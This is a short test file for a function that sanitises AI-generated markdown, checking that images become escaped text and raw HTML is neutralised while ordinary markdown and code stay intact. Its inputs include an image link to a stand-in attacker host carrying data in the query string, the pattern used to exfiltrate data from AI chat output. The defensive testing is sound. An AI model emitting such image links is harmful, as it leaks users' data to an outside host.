import { describe, expect, it } from 'vitest';
import { safeAiMarkdown } from '../ai-markdown';

describe('safeAiMarkdown', () => {
  it('turns images into links and raw HTML into text', () => {
    expect(safeAiMarkdown('Hi ![x](https://evil.example/?d=Termin) <img src=https://e/x>')).toBe(
      'Hi \\![x](https://evil.example/?d=Termin) &lt;img src=https://e/x>'
    );
    expect(safeAiMarkdown('![a][r]\r\n\r\n[r]: https://evil')).toBe(
      '\\![a][r]\n\n[r]: https://evil'
    );
  });

  it('keeps Markdown and code as written', () => {
    expect(safeAiMarkdown('**Fett** und `x < 5` und [Doku](https://www.home-assistant.io)')).toBe(
      '**Fett** und `x < 5` und [Doku](https://www.home-assistant.io)'
    );
    const fenced = '```yaml\nvalue: "{{ x < 5 }}"\n```\n<b>';
    expect(safeAiMarkdown(fenced)).toBe('```yaml\nvalue: "{{ x < 5 }}"\n```\n&lt;b>');
  });

  it('never treats an escaped backtick as code', () => {
    expect(safeAiMarkdown('\\`<img src=x>`')).toBe('\\`&lt;img src=x>`');
  });
});
